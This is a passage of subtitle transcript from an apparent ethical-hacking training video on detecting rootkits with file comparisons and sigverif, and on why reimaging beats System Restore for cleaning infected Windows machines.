the one right there.\n\n320\n00:15:50.150 --> 00:15:54.825\nCuz the chance of it being called I am\nyour rootkit.exe, it's very unlikely, so\n\n321\n00:15:54.825 --> 00:15:57.014\nwe may not recognize it for what it is.\n\n322\n00:15:57.014 --> 00:16:01.305\nSo as a result, what we're then\ngonna have to do is go to a clean,\n\n323\n00:16:01.305 --> 00:16:05.206\nessentially pristine,\nimage of this operating system.\n\n324\n00:16:05.206 --> 00:16:06.497\nSo this is a Windows 10 box,\n\n325\n00:16:06.497 --> 00:16:09.089\nI'd have to go find another\ncomputer that we know is clean.\n\n326\n00:16:09.089 --> 00:16:13.754\nDo the same exact thing on the same\ndirectory, get that list to output that.\n\n327\n00:16:13.754 --> 00:16:18.450\nThen, I have to take a tool that will\nlet me do a comparison between the two.\n\n328\n00:16:18.450 --> 00:16:19.560\nSomething like win dif, right?\n\n329\n00:16:19.560 --> 00:16:25.050\nWill be able to go through and\nwould allow me to able to look at\n\n330\n00:16:25.050 --> 00:16:29.950\nthat file or that group of files, right?\n\n331\n00:16:29.950 --> 00:16:33.510\nAnd I would be then able to do\na comparison that would allow me\n\n332\n00:16:33.510 --> 00:16:36.210\nto see whether or\nnot there's any differences.\n\n333\n00:16:36.210 --> 00:16:39.464\nSo, what we are looking at is\nliterally a binary comparison.\n\n334\n00:16:39.464 --> 00:16:43.830\nI got 10 files here, 12 over there which\none of these things is not like the other?\n\n335\n00:16:43.830 --> 00:16:45.480\nWhich one of these things does not belong?\n\n336\n00:16:45.480 --> 00:16:48.760\nRemember, your Sesame Street\nfrom when you were a kid, right?\n\n337\n00:16:48.760 --> 00:16:53.400\nSo if that's the case, and let's say we\nmaybe come up with, I don't know, 20 files\n\n338\n00:16:53.400 --> 00:16:58.690\nin theory that are gonna stand out between\nthe clean image and the infected machine.\n\n339\n00:16:58.690 --> 00:17:02.500\nNow I could zero in and look at what those\n20 files are that are tagged as Deltas,\n\n340\n00:17:02.500 --> 00:17:05.370\nand I could start to investigate,\nsee what they are, and, of course,\n\n341\n00:17:05.370 --> 00:17:08.950\npotentially as a result hopefully\ncome up with some answers.\n\n342\n00:17:08.950 --> 00:17:11.760\nNow this is a time\nintensive way of doing it.\n\n343\n00:17:11.760 --> 00:17:16.670\nBut it certainly would\npotentially allow me, right,\n\n344\n00:17:16.670 --> 00:17:20.580\nto go in and to see what may be there.\n\n345\n00:17:20.580 --> 00:17:23.790\nNow another thing I can do\nis look at a built in, so\n\n346\n00:17:23.790 --> 00:17:28.660\nit's been in the Windows operating system\nfor eons now, I don't even remember.\n\n347\n00:17:28.660 --> 00:17:32.930\nI think it may have been Windows 95 or 98\nthe first time this tool previewed itself.\n\n348\n00:17:32.930 --> 00:17:36.270\nBut a tool called sigverif,\nthe File Centers Verification tool.\n\n349\n00:17:36.270 --> 00:17:40.510\nSo you can run this, just go to\nthe run line, type in sigverif, s, i,\n\n350\n00:17:40.510 --> 00:17:44.860\ng, v, e, r, i, f on a Windows machine,\nI'm on Windows 10 right now,\n\n351\n00:17:44.860 --> 00:17:49.170\nit's running there, running on Windows 7,\nruns in Vista, runs in everything.\n\n352\n00:17:49.170 --> 00:17:51.470\nIt's a Native Operating System\ntool in other words and\n\n353\n00:17:51.470 --> 00:17:54.910\nwhat this does is this checks\nthe digital signature, so\n\n354\n00:17:54.910 --> 00:17:59.305\nit checks the hashes on\nthe core DLL files for windows.\n\n355\n00:17:59.305 --> 00:18:03.010\nSo, if your RootKit,\nyour malware has swapped out DLLs,\n\n356\n00:18:04.040 --> 00:18:06.940\nit's gonna tag those DLLs and\nsay, hey, wait a second,\n\n357\n00:18:06.940 --> 00:18:11.090\nthose signatures don't match, those files\naren't legitimate, you got a problem.\n\n358\n00:18:11.090 --> 00:18:13.450\nSo this may catch some of that activity,\nbut\n\n359\n00:18:13.450 --> 00:18:18.530\nit may not because if the RootKit hasn't\nactually messed with core system DLLs,\n\n360\n00:18:18.530 --> 00:18:22.480\nthis tool won't find it, but\nthe file comparison we just talked\n\n361\n00:18:22.480 --> 00:18:24.990\nabout will because it will\nlist all the files, right.\n\n362\n00:18:24.990 --> 00:18:27.500\nSo I can run that, just hit Start.\n\n363\n00:18:27.500 --> 00:18:29.700\nIt goes out, scans device drivers.\n\n364\n00:18:29.700 --> 00:18:32.664\nYou may or may not be able to see it\nscanning right now as it's going.\n\n365\n00:18:32.664 --> 00:18:35.640\nIt's going to check and\nsee, it's at about 70%.\n\n366\n00:18:35.640 --> 00:18:38.720\nOnce it finishes, it'll come back and\ntell me if I got any issues.\n\n367\n00:18:38.720 --> 00:18:41.867\nIf it does, it flags the files and\ntells me what the problem is, and\n\n368\n00:18:41.867 --> 00:18:44.900\nI can replace them or\nI can at least find out where they are.\n\n369\n00:18:44.900 --> 00:18:47.120\nGo into the directory,\nsay, I'll look at that.\n\n370\n00:18:47.120 --> 00:18:48.140\nIt's also scanning.\n\n371\n00:18:48.140 --> 00:18:49.090\nIt's scanned everything.\n\n372\n00:18:49.090 --> 00:18:51.690\nYour files have been scanned and\nverified as digitally signed.\n\n373\n00:18:51.690 --> 00:18:53.010\nThere's no issues there.\n\n374\n00:18:53.010 --> 00:18:55.010\nNo issues.\nNo malware, that's good to know,\n\n375\n00:18:55.010 --> 00:18:57.380\nconsidering we're using the box.\n\n376\n00:18:57.380 --> 00:18:58.505\nAlways good to check.\n\n377\n00:18:58.505 --> 00:19:01.412\nBecause you never know overnight,\npeople come in here, they play around.\n\n378\n00:19:01.412 --> 00:19:04.152\nThose little malware gremlins\nare around when nobody's here.\n\n379\n00:19:04.152 --> 00:19:08.570\nBut sigverif will also allow\nus to potentially find that.\n\n380\n00:19:08.570 --> 00:19:10.990\nBut keep in mind it's a very\nlimited window for that, right.\n\n381\n00:19:10.990 --> 00:19:15.020\nThat's really the kind of thing that it\nmay only work if you have that specific\n\n382\n00:19:15.020 --> 00:19:18.470\nkind of RootKit that may be swapping\nout those DLLs, manipulating them.\n\n383\n00:19:18.470 --> 00:19:21.650\nIf not, the activity may go unnoticed,\nyou may not find it, but\n\n384\n00:19:21.650 --> 00:19:23.820\nit's another way potentially to go in and\ntake a look.\n\n385\n00:19:23.820 --> 00:19:28.350\nSo just a quick idea there of what we\ncould do to find, potentially, a RootKit.\n\n386\n00:19:28.350 --> 00:19:33.480\nNow remember, we may download a specific\nRootKit revealer after we've done that and\n\n387\n00:19:33.480 --> 00:19:35.410\nlooked at the 20 files\nthat are the Deltas and\n\n388\n00:19:35.410 --> 00:19:38.230\nsaid, it looks like I've got these\nkind of files, let me go out,\n\n389\n00:19:38.230 --> 00:19:41.770\ndo a little research online,\nlet me figure out what those files are.\n\n390\n00:19:41.770 --> 00:19:46.880\nLooks like they point to\nthe MyCast Malware, or whatever it is, and\n\n391\n00:19:46.880 --> 00:19:50.980\nso we're gonna go out and we're gonna grab\nwhatever information we find about that\n\n392\n00:19:50.980 --> 00:19:54.490\nparticular piece of malware and it says\nhere, by the way, yeah, there’s this\n\n393\n00:19:54.490 --> 00:19:57.730\nsoftware that we can use to try to treat\nit so we may have to download that.\n\n394\n00:19:57.730 --> 00:20:01.389\nIt’s a multi step process to go out and\nfind this stuff, research and\n\n395\n00:20:01.389 --> 00:20:02.558\nfigure it out.\n\n396\n00:20:02.558 --> 00:20:04.980\nIt’s not gonna be just a one click, boom,\n\n397\n00:20:04.980 --> 00:20:07.890\nit’s gone kind of thing,\nif it is chances are good that you’ve\n\n398\n00:20:07.890 --> 00:20:10.620\nreplaced that problem with another\nproblem as we’ve been talking about.\n\n399\n00:20:10.620 --> 00:20:14.570\nSo you got to really understand this\nis a time intensive methodology.\n\n400\n00:20:14.570 --> 00:20:16.080\nBut as an ethical hacker,\n\n401\n00:20:16.080 --> 00:20:19.410\none of the things we're going to often be\ncalled on to do, and we'll talk about this\n\n402\n00:20:19.410 --> 00:20:23.950\nagain as we talk about malware in upcoming\nepisodes, is a lot of times we're gonna be\n\n403\n00:20:23.950 --> 00:20:27.630\ncalled on to respond to a system\nthat maybe infected, right?\n\n404\n00:20:27.630 --> 00:20:31.240\nAnd we are called upon to look at\nthe system that may have a problem and\n\n405\n00:20:31.240 --> 00:20:34.300\nsomebody's already got in, they've already\nbroken in, they've hacked the box.\n\n406\n00:20:34.300 --> 00:20:37.050\nOur defenses for\nwhatever reason were not good enough.\n\n407\n00:20:37.050 --> 00:20:39.940\nWe've been focusing up until now for\nthe most part\n\n408\n00:20:39.940 --> 00:20:43.540\nin the majority of our episodes on the\nmethodology that we keep coming back to.\n\n409\n00:20:43.540 --> 00:20:46.150\nHey, let's go recon and footprint, right?\n\n410\n00:20:46.150 --> 00:20:47.840\nLet's go ahead, let's enumerate.\n\n411\n00:20:47.840 --> 00:20:50.010\nLet's go ahead and\nlet's gather information.\n\n412\n00:20:50.010 --> 00:20:53.910\nWe're looking at ways we can\nprofile systems, understand risk,\n\n413\n00:20:53.910 --> 00:20:58.750\nassess vulnerabilities and take\nadvantage to them, to assess impact and\n\n414\n00:20:58.750 --> 00:21:00.590\nexposure and then remediate, right.\n\n415\n00:21:00.590 --> 00:21:03.700\nI mean this is really methodology\nwho've been going through up until now.\n\n416\n00:21:03.700 --> 00:21:05.500\nAll, that's good but\n\n417\n00:21:05.500 --> 00:21:09.140\nreality is you're not gonna infect\nthe system with malware on purpose.\n\n418\n00:21:09.140 --> 00:21:10.920\nright?\nJust to figure it out.\n\n419\n00:21:10.920 --> 00:21:12.060\nI mean, you shouldn't be.\n\n420\n00:21:12.060 --> 00:21:12.960\nLet me put it that way.\n\n421\n00:21:12.960 --> 00:21:14.160\nIt's not a good idea.\n\n422\n00:21:14.160 --> 00:21:18.640\nYou may, in certain situations,\ngo in and have a research capability,\n\n423\n00:21:18.640 --> 00:21:21.520\nhave an isolated lab,\nyou wanna play around with something,\n\n424\n00:21:21.520 --> 00:21:24.710\nfigure out what is does, by all means\ngo do that as long as you do it safely.\n\n425\n00:21:24.710 --> 00:21:27.175\nThere's nothing wrong with that but\nin production,\n\n426\n00:21:27.175 --> 00:21:30.737\nyou're not gonna normally infect machines\nso you've got something to do for\n\n427\n00:21:30.737 --> 00:21:33.650\na few hours, to go clean it up and\npractice your skills.\n\n428\n00:21:33.650 --> 00:21:38.050\nSo you're normally not gonna be playing\nwith this stuff unless it shows up and\n\n429\n00:21:38.050 --> 00:21:42.420\nsomehow got through all those defensive\nmechanisms we've been talking about.\n\n430\n00:21:42.420 --> 00:21:46.590\nSo the reality is, while you will see\nmalware, you will see viruses, you will\n\n431\n00:21:46.590 --> 00:21:50.450\nsee all this kind of stuff at some point,\nif you do this long enough because there's\n\n432\n00:21:50.450 --> 00:21:53.980\nall sorts of zero day stuff out there that\nwill get through all the screens you may\n\n433\n00:21:53.980 --> 00:21:58.910\nput up, you're probably gonna have to come\nin forensically and as a CEH, react to\n\n434\n00:21:58.910 --> 00:22:03.590\nthis situation, assess the system, isolate\nit, and figure out what's on there.\n\n435\n00:22:03.590 --> 00:22:06.340\nA lot of times you may never\nknow what was on that machine.\n\n436\n00:22:06.340 --> 00:22:09.850\nWe were talking about the idea\nof reimaging versus uninstalling\n\n437\n00:22:09.850 --> 00:22:11.720\nbefore we came on to do the episode.\n\n438\n00:22:11.720 --> 00:22:15.970\nAnd lot of times, you're not gonna have\nan unlimited amount of time to respond\n\n439\n00:22:15.970 --> 00:22:20.370\nto this particular issue and\ntake a month to research that box.\n\n440\n00:22:20.370 --> 00:22:23.470\nSomebody needs to get back online,\nthey need their computer.\n\n441\n00:22:23.470 --> 00:22:26.110\nYou can't hook that box back up to\nthe outside world without knowing\n\n442\n00:22:26.110 --> 00:22:26.940\nwhat's on it.\n\n443\n00:22:26.940 --> 00:22:31.060\nSo it's the wipe and replace,\nessentially that we often do.\n\n444\n00:22:31.060 --> 00:22:33.510\nYou get a few minutes to just triage it,\n\n445\n00:22:33.510 --> 00:22:36.170\nperhaps just in general make\nsure you know what's going on.\n\n446\n00:22:36.170 --> 00:22:40.220\nYou may get a little bit of time to\nsee if you can fix it, but even if you\n\n447\n00:22:40.220 --> 00:22:43.770\nfix it you may not be confident enough\nthat that box is still gonna be safe.\n\n448\n00:22:43.770 --> 00:22:45.130\nI mean, that's one of the issues.\n\n449\n00:22:45.130 --> 00:22:46.940\nSomebody got into it,\nyou might not know how,\n\n450\n00:22:46.940 --> 00:22:50.700\nand even if you figure out how,\nyou may not be able to stop them again if\n\n451\n00:22:50.700 --> 00:22:54.595\nthey come back because they may have left\nstuff in there, you just can't find it.\n\n452\n00:22:54.595 --> 00:23:00.090\nReally true, sure fire way to fix this\nproblem is to blowout the OS and reinstall\n\n453\n00:23:00.090 --> 00:23:05.680\nit, fixing by eliminating the problem once\nand for all at least in that image anyway.\n\n454\n00:23:05.680 --> 00:23:08.870\nUntil it recompromised at some\npoint later for some other reason.\n\n455\n00:23:08.870 --> 00:23:13.080\nFixing whatever concerns or maybe because\nwhatever software that's left behind\n\n456\n00:23:13.080 --> 00:23:15.760\nwould be removed due to\nthe imaging process.\n\n457\n00:23:15.760 --> 00:23:17.670\nNow, a lot of times, it's kind of\nthe middle of the road here, right?\n\n458\n00:23:17.670 --> 00:23:21.000\nSo, a lot of times people say, okay,\nI can blow it out and get that but,\n\n459\n00:23:21.000 --> 00:23:25.170\nwhat about using some sort of time travel\nmechanism, almost like a snapshot.\n\n460\n00:23:25.170 --> 00:23:28.410\nWhat if we have system restore in windows,\nand what if I can go back\n\n461\n00:23:28.410 --> 00:23:32.195\nknowing that in theory,\nI think I was compromised five days ago.\n\n462\n00:23:32.195 --> 00:23:37.470\nWhat if I go back to my last system\nrestore point prior to that, and\n\n463\n00:23:37.470 --> 00:23:41.870\nI do a restore, won't I in theory, based\non how the technology works, right, one,\n\n464\n00:23:41.870 --> 00:23:46.550\nI uninstall all the software that was put\ninto the box whatever it was, good, bad,\n\n465\n00:23:46.550 --> 00:23:47.390\nand different.\n\n466\n00:23:47.390 --> 00:23:50.600\nOne, I get rid of it all and so we got\nback to a prior time because essentially\n\n467\n00:23:50.600 --> 00:23:53.850\naren't we really just snapshotting,\nthe box with system restore.\n\n468\n00:23:53.850 --> 00:23:57.310\nSo the answer is yes and\nno like everything else, right?\n\n469\n00:23:57.310 --> 00:23:58.520\nIn theory would you?\n\n470\n00:23:58.520 --> 00:23:59.910\nYeah, that's how the technology works.\n\n471\n00:23:59.910 --> 00:24:00.850\nAbsolutely.\n\n472\n00:24:00.850 --> 00:24:03.478\nBut here's the problem.\nWhat if the RootKit has buried itself so\n\n473\n00:24:03.478 --> 00:24:08.463\ndeeply, changed its name because its a\npolymorphic RootKit, which is essentially\n\n474\n00:24:08.463 --> 00:24:13.463\ngonna change Every time it gets activated,\nand it's gonna modify it's code base.\n\n475\n00:24:13.463 --> 00:24:18.620\nIt's gonna reinstall under a different\nname, it's gonna change and modify files.\n\n476\n00:24:18.620 --> 00:24:21.380\nIf it could do all that it's\nprobably good enough to hide\n\n477\n00:24:21.380 --> 00:24:23.675\nright from a system restore point.\n\n478\n00:24:23.675 --> 00:24:27.805\nModifying the attributes on the file\nstamps that says hey, you got installed\n\n479\n00:24:27.805 --> 00:24:32.535\nhere, and as a result, it's gonna hide in\nsuch a way that it may not be uninstalled.\n\n480\n00:24:32.535 --> 00:24:36.955\nAnd this is a problem with built in\noperating system technology like system\n\n481\n00:24:36.955 --> 00:24:38.140\nrestore in Windows.\n\n482\n00:24:38.140 --> 00:24:41.900\nIt's a great concept and it works really\nwell when you're patching the box and\n\n483\n00:24:41.900 --> 00:24:45.080\nyou wanna uninstall that patch or\ngo back to a prior time.\n\n484\n00:24:45.080 --> 00:24:50.350\nThat stuff's good as long as it's\nnot invasive and malignant software.\n\n485\n00:24:50.350 --> 00:24:54.260\nBut the problem is that if the softwares\ninsidious enough to be able to do those\n\n486\n00:24:54.260 --> 00:24:58.120\nkind of things, it's probably good\nenough to evade that system and\n\n487\n00:24:58.120 --> 00:24:59.220\nyou may not remove it.\n\n488\n00:24:59.220 --> 00:25:02.240\nAnd you may not know it's been removed or\nnot is the problem right.\n\n489\n00:25:02.240 --> 00:25:05.870\nSo maybe there or may not be and there's\nreally no sure fire way to tell that's\n\n490\n00:25:05.870 --> 00:25:08.290\ngonna get removed or\nthat all the remnants of it.\n\n491\n00:25:08.290 --> 00:25:11.100\nPress one of the things it spawns,\nthat it throws in there and\n\n492\n00:25:11.100 --> 00:25:14.100\nleaves behind because really all we're\ndoing is looking at timestamps and\n\n493\n00:25:14.100 --> 00:25:15.720\nattributes on those files, right?\n\n494\n00:25:15.720 --> 00:25:19.180\nSo, it could easily\nmodify restore points and\n\n495\n00:25:19.180 --> 00:25:21.030\nthat would not be unusual by any means.\n\n496\n00:25:21.030 --> 00:25:23.030\nThere is malware out\nthere that can do that.\n\n497\n00:25:23.030 --> 00:25:25.590\n>> Yeah, I've seen some of that\nmalware that actually breaks\n\n498\n00:25:25.590 --> 00:25:27.340\n>> The whole restore point process so\n\n499\n00:25:27.340 --> 00:25:31.180\nyou can sit there for\n45 minutes waiting for it to restore.\n\n500\n00:25:31.180 --> 00:25:34.040\nit gets to the very end and\nit says, unable to restore,\n\n501\n00:25:34.040 --> 00:25:35.920\nno changes have been made to your system.\n\n502\n00:25:35.920 --> 00:25:39.490\nOr you get the fact that, what infected\nthe machine in the first place?\n\n503\n00:25:39.490 --> 00:25:41.930\nIt was a file that this\nuser had downloaded,\n\n504\n00:25:41.930 --> 00:25:44.870\nyou do a restore point it rolls your\nregistry back and your software.\n\n505\n00:25:44.870 --> 00:25:47.440\nRemember, it doesn't affect\nyour user files right?\n\n506\n00:25:47.440 --> 00:25:51.240\nSo, your emails are still there,\nall your documents are still there.\n\n507\n00:25:51.240 --> 00:25:55.610\nSo, you roll it back, think everything's\nclean, user gets their system back,\n\n508\n00:25:55.610 --> 00:25:59.070\nthey click on that file again,\nyou're infected one more time, right?\n\n509\n00:25:59.070 --> 00:26:00.560\nSo, it really didn't get you anywhere.\n\n510\n00:26:00.560 --> 00:26:02.115\n>> It's the gift that keeps on giving.\n\n511\n00:26:02.115 --> 00:26:04.260\n>> [LAUGH]\n>> So it is a problem.\n\n512\n00:26:04.260 --> 00:26:07.300\nMike was just up in the chat room right\nnow was talking about a specific incidence\n\n513\n00:26:07.300 --> 00:26:08.720\nof Ransom Ware that does this.\n\n514\n00:26:08.720 --> 00:26:10.460\nAnd Mike it's a great comment to make.\n\n515\n00:26:10.460 --> 00:26:12.890\nLocky Ransom Ware will\ndefinitely will do this and\n\n516\n00:26:12.890 --> 00:26:16.440\nwill do some of the things that are Mike\nhere, not Mike in the chatroom.\n\n517\n00:26:16.440 --> 00:26:18.070\nTwo Mikes together, Mike squared.\n\n518\n00:26:18.070 --> 00:26:20.560\n>> We're talking about, but\nlow key is about a great example of that.\n\n519\n00:26:20.560 --> 00:26:22.130\nIt's a great thing to think about.\n\n520\n00:26:22.130 --> 00:26:26.370\nSo while we wanna be of all our\nopportunities is what I'm suggesting,\n\n521\n00:26:26.370 --> 00:26:30.070\nall the tools that are arsenal, that\ntalk a lot about building that toolkit\n\n522\n00:26:30.070 --> 00:26:32.260\nas a CEH and what those tools look like.\n\n523\n00:26:32.260 --> 00:26:33.950\nYou wanna know the availability of tools.\n\n524\n00:26:33.950 --> 00:26:35.670\nYou wanna understand their strengths, but\n\n525\n00:26:35.670 --> 00:26:38.410\nalso you have to understand their\nlimitations and their weaknesses.\n\n526\n00:26:38.410 --> 00:26:40.220\nAnd this is not a knock, let me be clear.\n\n527\n00:26:40.220 --> 00:26:43.870\nIt's not a knock against Windows,\nnot a knock against System Restore Tool,\n\n528\n00:26:43.870 --> 00:26:45.100\nit's a great tool.\n\n529\n00:26:45.100 --> 00:26:48.730\nIt has a purpose,\nit is very valuable for what it does.\n\n530\n00:26:48.730 --> 00:26:50.410\nBut, it was never designed, nor\n\n531\n00:26:50.410 --> 00:26:54.110\ndoes Microsoft claim it be\nto a malware removal system.\n\n532\n00:26:54.110 --> 00:26:55.300\nIt's not designed to work that way.\n\n533\n00:26:55.300 --> 00:26:59.350\nIt's not designed to operate under those\nconditions and trying to repurpose it is\n\n534\n00:26:59.350 --> 00:27:02.040\nall that I'm trying to,\nis probably not going to be effective.\n\n535\n00:27:02.040 --> 00:27:03.930\nCuz I get that a lot, people say, well.\n\n536\n00:27:03.930 --> 00:27:05.920\nI did that and it seemed to be okay.\n\n537\n00:27:05.920 --> 00:27:10.020\nBut then the issue that Microsoft pointed\nout, hey we're not really removing\n\n538\n00:27:10.020 --> 00:27:14.560\nthe user specific data in the applications\ncaches and things like that.\n\n539\n00:27:14.560 --> 00:27:17.840\nAnd as a result if you go and\nclick on that infected file,\n\n540\n00:27:17.840 --> 00:27:21.970\nthat potential to re-infect is sitting\nin the system after system restore.\n\n541\n00:27:21.970 --> 00:27:25.910\nSo you gotta know that really\nthe only sure fire method\n\n542\n00:27:25.910 --> 00:27:27.830\nis just total removal right.\n\n543\n00:27:27.830 --> 00:27:31.920\nJust carpet bomb the OS, right,\nand nuclear, nuclear option,\n\n544\n00:27:31.920 --> 00:27:34.610\ngo right to it, and format it.\n\n545\n00:27:34.610 --> 00:27:37.170\nRestart from scratch reinstall.\n\n546\n00:27:37.170 --> 00:27:38.920\nNow here's something\ninteresting I also get.\n\n547\n00:27:38.920 --> 00:27:41.750\nSo with the newer Windows\noperating systems, right.\n\n548\n00:27:42.920 --> 00:27:44.565\nWe can go and we can use Windows To Go.\n\n549\n00:27:44.565 --> 00:27:45.360\n>> Mm-hm.\n>> Right.\n\n550\n00:27:45.360 --> 00:27:48.260\nWindows 8, Windows 8.1, Windows 10,\nI dont know if you've seen this.\n\n551\n00:27:48.260 --> 00:27:50.640\nSome cool demos if you\nhaven't seen it running.\n\n552\n00:27:50.640 --> 00:27:52.530\nMicrosoft has a great video on it.\n\n553\n00:27:52.530 --> 00:27:54.800\nIt's about a three or\nfour minute marketing piece.\n\n554\n00:27:54.800 --> 00:27:59.100\nYeah but the guy's basically running\nhis OS, and then something happens and\n\n555\n00:27:59.100 --> 00:28:02.400\nliterally somebody pulls the USB\nthumb drive out that it's running on.\n\n556\n00:28:02.400 --> 00:28:04.250\nThe OS freezes on the screen.\n\n557\n00:28:04.250 --> 00:28:06.830\nAs long as you put that thumb\ndrive back in within about thirty,\n\n558\n00:28:06.830 --> 00:28:10.040\nI actually think it's about a minute,\nit actually just picks right back up and\n\n559\n00:28:10.040 --> 00:28:11.160\njust caches the memory.\n\n560\n00:28:11.160 --> 00:28:13.970\nSo the reality is that you can't\neven crash the operating system\n\n561\n00:28:13.970 --> 00:28:15.280\nby pulling out the drive.\n\n562\n00:28:15.280 --> 00:28:17.210\nRIght?\nSo I mean Windows To Go is cool because it\n\n563\n00:28:17.210 --> 00:28:22.300\nruns on an external USB stick or a device\nof some kind, again, here's the challenge.\n\n564\n00:28:22.300 --> 00:28:26.220\nIf that core image gets infected\nyou can unplug that and\n\n565\n00:28:26.220 --> 00:28:30.580\nplug it back in in a million places you're\nessentially going leave behind a trail of\n\n566\n00:28:30.580 --> 00:28:35.230\ndestruction on every system you\ntouch with that Windows-To-Go drive.\n\n567\n00:28:35.230 --> 00:28:36.110\nAnother issue, right?\n\n568\n00:28:36.110 --> 00:28:40.570\nBecause you are now loading the OS off\nof external media and as a result,\n\n569\n00:28:40.570 --> 00:28:43.250\nyou are running that OS from that system.\n\n570\n00:28:43.250 --> 00:28:45.940\nYou are supposedly and\nfor the most part true,\n\n571\n00:28:45.940 --> 00:28:51.130\nnot touching the hard drive a ton via\nphysical machine running against.\n\n572\n00:28:51.130 --> 00:28:54.570\nWe don't write back to it but there\nare certain things that are being done and\n\n573\n00:28:54.570 --> 00:28:56.760\nyou are accessing system resources.\n\n574\n00:28:56.760 --> 00:28:59.450\nIf you have a rootkit that's\na firmware based rootkit.\n\n575\n00:28:59.450 --> 00:29:02.390\nsitting on that USB device,\nit may be able to go in and\n\n576\n00:29:02.390 --> 00:29:07.270\nattack the physical host that you're\nrunning on and attack the hardware.\n\n577\n00:29:07.270 --> 00:29:10.960\nAnd that could be behind a rootkit\nthat would then compromise the OS\n\n578\n00:29:10.960 --> 00:29:15.220\non the system when you restart using\nthe embedded OS or whatever the OS is.\n\n579\n00:29:15.220 --> 00:29:18.380\nSo there's a lot of complexity\nassociated with this stuff,\n\n580\n00:29:18.380 --> 00:29:22.750\nI mean rootkits are just tremendously\nproblematic, as a CEH one of the biggest\n\n581\n00:29:22.750 --> 00:29:25.980\nthreats we faceiIs potentially\na system with a rootkit on it.\n\n582\n00:29:25.980 --> 00:29:28.790\nBelieve or not, because there isn't\nreally a good way to respond,\n\n583\n00:29:28.790 --> 00:29:30.460\nit's very difficult to get rid of them.\n\n584\n00:29:30.460 --> 00:29:31.950\nWhile you could invest a lot of time and\n\n585\n00:29:31.950 --> 00:29:36.110\nenergy in doing so it may very well\nturn out to be an uphill battle that you\n\n586\n00:29:36.110 --> 00:29:38.930\njust may never really be confident\nthat you're going to win.\n\n587\n00:29:38.930 --> 00:29:42.350\nAnd it may be easier to\njust declare defeat and\n\n588\n00:29:42.350 --> 00:29:45.770\nrestart by rebooting,\nessentially reformatting the OS.\n\n589\n00:29:45.770 --> 00:29:47.840\nI don't have a problem saying look,\n\n590\n00:29:47.840 --> 00:29:50.110\nI'm not investing the time in fixing this,\nright?\n\n591\n00:29:50.110 --> 00:29:52.598\nI mean, look, you,\nunfortunately Mr. and Mrs.\n\n592\n00:29:52.598 --> 00:29:56.980\nUser did something good, bad right wrong\nand I'm blaming you but just understand.\n\n593\n00:29:56.980 --> 00:29:58.940\nYou made some bad choices here right.\n\n594\n00:29:58.940 --> 00:30:02.820\nWhether you know them or not and\nthe quickest most experience and\n\n595\n00:30:02.820 --> 00:30:06.680\nsafest way for\nthe community to survive this issue is for\n\n596\n00:30:06.680 --> 00:30:09.810\nus to get rid of your stuff and\nfor you to start over.\n\n597\n00:30:09.810 --> 00:30:11.080\nI'm sorry that's the case, but\n\n598\n00:30:11.080 --> 00:30:14.350\nthat's just the reality, and\nit is about the common good, right?\n\n599\n00:30:14.350 --> 00:30:18.890\nI mean, I want to try to be good to that\none individual and try to help them.\n\n600\n00:30:18.890 --> 00:30:21.715\nBut, as I tell my kids all the time,\nlife is about making good choices, right?\n\n601\n00:30:21.715 --> 00:30:23.565\nYou gotta plan to be successful or\n\n602\n00:30:23.565 --> 00:30:27.985\nyou gotta plan to fail,\nand I don't like to fail.\n\n603\n00:30:27.985 --> 00:30:28.545\nThat's just me.\n\n604\n00:30:28.545 --> 00:30:31.325\nI don't wanna spend time cleaning\nup other people's messes and\n\n605\n00:30:31.325 --> 00:30:32.625\nhaving to do it again and again and again.\n\n606\n00:30:32.625 --> 00:30:34.445\nI had kids for that reason.\n\n607\n00:30:34.445 --> 00:30:36.665\nI don't have pets for that reason.\n\n608\n00:30:36.665 --> 00:30:39.250\nI don't want to have to do it for\nmy users.\n\n609\n00:30:39.250 --> 00:30:42.710\nAnd I'm being overly simplistic, but\nI want you to understand that, right?\n\n610\n00:30:42.710 --> 00:30:45.770\nYou've gotta make decisions on\nbehalf of your users as CEHs,\n\n611\n00:30:45.770 --> 00:30:50.150\nas ethical hackers, all the time to\nensure the security and the integrity,\n\n612\n00:30:50.150 --> 00:30:51.750\nthe common good in the community.\n\n613\n00:30:51.750 --> 00:30:54.980\nAnd that may mean that you have to\ninconvenience the user in order to\n\n614\n00:30:54.980 --> 00:30:57.220\nMake sure that everybody\nelse is gonna be secure.\n\n615\n00:30:57.220 --> 00:30:59.900\nYou should not be afraid to make\nthose decisions, by the way.\n\n616\n00:30:59.900 --> 00:31:03.260\nBut as we've often talked about, you\nneed to make sure you have the backing,\n\n617\n00:31:03.260 --> 00:31:06.680\nyou have the understanding and\nyou have support of senior management.\n\n618\n00:31:06.680 --> 00:31:10.725\nThis is not about What you think,\nas a dictatorial statement,\n\n619\n00:31:10.725 --> 00:31:11.585\nis the best way to go.\n\n620\n00:31:11.585 --> 00:31:15.645\nYou remember that SNL skit years\nago with the crazy IT guy?\n\n621\n00:31:15.645 --> 00:31:16.845\nGet out of my way!\n\n622\n00:31:16.845 --> 00:31:18.175\nIt's just like the rude IT guy.\n\n623\n00:31:18.175 --> 00:31:19.995\nLike, you don't know anything,\nyou're stupid.\n\n624\n00:31:19.995 --> 00:31:20.565\nRight?\n\n625\n00:31:20.565 --> 00:31:21.595\nAnd he's just always-\n>> Move!\n\n626\n00:31:21.595 --> 00:31:22.915\n>> Putting down users, right?\n\n627\n00:31:22.915 --> 00:31:24.445\nWe don't that to happen.\n\n628\n00:31:24.445 --> 00:31:26.975\nThat's not the point,\nthat's not what we want.\n\n629\n00:31:26.975 --> 00:31:32.490\nUltimately, the goal is, we want to make\nsure we satisfy the prime directive right?\n\n630\n00:31:32.490 --> 00:31:35.470\nAnd the prime directive\nis secure all right?\n\n631\n00:31:35.470 --> 00:31:37.300\nNot satisfy one.\n\n632\n00:31:37.300 --> 00:31:40.510\nRight?\nAnd we want to make sure that in that way\n\n633\n00:31:40.510 --> 00:31:42.560\nwe are trying to do the best and\nthe most good.\n\n634\n00:31:42.560 --> 00:31:44.600\nSo, let's think about that.\n\n635\n00:31:44.600 --> 00:31:45.750\nThink about how you detect root kits.\n\n636\n00:31:45.750 --> 00:31:47.080\nWe talked about that, right?\n\n637\n00:31:47.080 --> 00:31:50.830\nThere's integrity based detection,\nthere's based detection,\n\n638\n00:31:50.830 --> 00:31:53.320\nheuristic and/or behavior based detection.\n\n639\n00:31:53.320 --> 00:31:57.730\nRuntime execution path profiling,\nlooking at what's in the runtime,\n\n640\n00:31:57.730 --> 00:32:00.960\nhow do we find what's there, what is,\nwhat's not there, what should be there.\n\n641\n00:32:00.960 --> 00:32:03.368\nThere's cross 